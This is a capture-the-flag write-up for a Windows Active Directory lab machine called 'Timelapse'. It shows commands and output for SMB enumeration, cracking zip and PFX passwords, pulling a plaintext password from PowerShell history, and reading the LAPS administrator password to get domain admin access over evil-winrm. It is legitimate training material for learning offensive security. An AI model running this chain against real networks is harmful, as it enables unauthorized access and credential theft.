![](/images/timelapse-banner.png)

# Timelapse
easy | windows | 20pts

Still pretty new to Windows based challenges, so this was a hard but fun one!

## Port Scanning

```console
$ nmap -A -Pn 10.10.11.152
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 16:48 +04
Nmap scan report for 10.10.11.152
Host is up (0.20s latency).

PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
88/tcp  open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-16 20:48:41Z)
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds?
464/tcp open  kpasswd5?
593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp open  ldapssl?
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m58s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2022-08-16T20:49:00
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.80 seconds
```

One open ports was an SMB port, so I checked for any shares we can access without a password.

## SMB Enumeration

```console
$ smbclient -L //10.10.11.152/
Password for [WORKGROUP\piya]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	Shares          Disk
	SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

`Shares` is one, and it had two directories, `Dev` and `HelpDesk`.

```console
$ smbclient //10.10.11.152/Shares
Password for [WORKGROUP\piya]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Oct 25 19:39:15 2021
  ..                                  D        0  Mon Oct 25 19:39:15 2021
  Dev                                 D        0  Mon Oct 25 23:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 19:48:42 2021

		6367231 blocks of size 4096. 2467451 blocks available
smb: \> cd Dev
smb: \Dev\> dir
  .                                   D        0  Mon Oct 25 23:40:06 2021
  ..                                  D        0  Mon Oct 25 23:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 19:46:42 2021

		6367231 blocks of size 4096. 2467451 blocks available
smb: \Dev\> cd ..\HelpDesk
smb: \HelpDesk\> dir
  .                                   D        0  Mon Oct 25 19:48:42 2021
  ..                                  D        0  Mon Oct 25 19:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 18:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 18:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 18:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 18:57:44 2021

                6367231 blocks of size 4096. 2467451 blocks available
```

`winrm_backup.zip` looked interesting, so I downloaded the file and tried to unzip it. What is WinRM? Windows Remote Management, aka SSH for Windows.

```console
smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (3.1 KiloBytes/sec) (average 3.1 KiloBytes/sec)
$ unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password:
```
The zip file requires a password, so I attempted to crack it using `fcrackzip`

## Crack Passwords

```console
$ fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt winrm_backup.zip

PASSWORD FOUND!!!!: pw == supremelegacy

$ unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password:
  inflating: legacyy_dev_auth.pfx
```

A .pfx file (Personal Information Exchange file), which is in a PKCS#12 format, contains the SSL certificate (public keys) and the corresponding private keys. It is possible to extract the public and private key from this file if we have the import password. [^1]

I found a tool called [crackpkcs12](https://github.com/crackpkcs12/crackpkcs12) to crack the import password. Not sure why it segfaulted in the end, but it found the password!

```console
$ crackpkcs12 -d rockyou.txt -v legacyy_dev_auth.pfx

Dictionary attack - Starting 8 threads

*********************************************************
Dictionary attack - Thread 3 - Password found: thuglegacy
*********************************************************

[1]    8829 segmentation fault  crackpkcs12 -d rockyou.txt -v legacyy_dev_auth.pfx
```

Then I extracted the public and private keys with the password `thuglegacy`. [^2]

```console
$ # Export private key
$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy-priv.pem -nodes
Enter Import Password:

$ # Export public key
$ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem
Enter Import Password:
```

### Foothold + User Flag

I used [evil-winrm](https://github.com/Hackplayers/evil-winrm) with the public and private keys to gain foothold into the system and get the user flag.

```console
$ evil-winrm -i 10.10.11.152 -S -c timelapse-pub.pem -k timelapse-priv.pem -r timelapse
Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\legacyy\Documents> dir ../Desktop

    Directory: C:\Users\legacyy\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        8/16/2022   5:58 AM             34 user.txt


*Evil-WinRM* PS C:\Users\legacyy\Documents> type ../Desktop/user.txt
<FLAG>
```

## System Enumeration

I wasn't sure what to do next from here, so I referred to the official forum discussion for hints. One hint was to check the console history for this user.

```console
*Evil-WinRM* PS C:\Users\legacyy\Desktop> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

A username/password pair! I used this information in evil_winrm to login as `svc_deploy`.

```console
evil-winrm -i 10.10.11.152 -S -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -r timelapse

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Warning: User is not needed for Kerberos auth. Ticket will be used

Warning: Password is not needed for Kerberos auth. Ticket will be used

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_deploy\Documents>
```

Earlier when we accessed the `Shares` share, the `HelpDesk` directory contained documents relating to LAPS. LAPS or Local Administrator Password Solution is a Microsoft product that manages the local administrator password and stores it in Active Directory. It randomizes the password regularly. There is a LAPS Readers that lists users who have the permission to read the password.[^3] So I checked if `svc_deploy` is part of this group.

```console
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ 
==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled 
group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled 
group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled 
group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled 
group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled 
group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled 
grou
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled 
group
TIMELAPSE\LAPS_Readers                      Group            S-1-5-21-671920749-559770252-3318990721-2601 Mandatory group, Enabled by default, Enabled 
group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled 
group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

Aaand it is!
Earlier I did not understand why we logged in as `svc_deploy`, since we were already logged in as `legacyy`. On checking the groups of both users, I found that `legacyy` was not a part of the `LAPS_Readers` group, while `svc_deploy` was. So to get admin access, logging in as `svc_deploy` was necessary.

## Privilege Escalation + Root Flag

I retrieved the Administrator's password using the following command [^4]

```console
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime


DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName                 : dc01.timelapse.htb
Enabled                     : True
ms-Mcs-AdmPwd               : Q3/6BK#18e3T)z/Xi[79;9e{
ms-Mcs-AdmPwdExpirationTime : 133056001076530842
Name                        : DC01
ObjectClass                 : computer
ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName              : DC01$
SID                         : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName           :

...
```

Time to log in as Adminstrator!

```console
$ evil-winrm -i 10.10.11.152 -S -u Administrator -p 'Q3/6BK#18e3T)z/Xi[79;9e{' -r timelapse

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Warning: SSL enabled

Warning: User is not needed for Kerberos auth. Ticket will be used

Warning: Password is not needed for Kerberos auth. Ticket will be used

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> dir ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

No flag? Oh. 
I tried resetting the machine once, thinking someone may have deleted it, but still no flag. I checked the forum for any hints, and one of the users mentioned to check other users.

```console
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir ../../


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/23/2021  11:27 AM                Administrator
d-----       10/25/2021   8:22 AM                legacyy
d-r---       10/23/2021  11:27 AM                Public
d-----       10/25/2021  12:23 PM                svc_deploy
d-----        2/23/2022   5:45 PM                TRX
```

User `TRX` found, flags are generally found in the Desktop directory so I checked there

```console
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../../TRX/
*Evil-WinRM* PS C:\Users\TRX> dir Desktop


    Directory: C:\Users\TRX\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        8/16/2022   5:01 PM             34 root.txt


*Evil-WinRM* PS C:\Users\TRX> type Desktop/root.txt
<FLAG>
```

Challenge complete!

[^1]: https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file
[^2]: https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/
[^3]: https://itconnect.uw.edu/wares/msinf/ous/laps/
[^4]: https://smarthomepursuits.com/export-laps-passwords-powershell/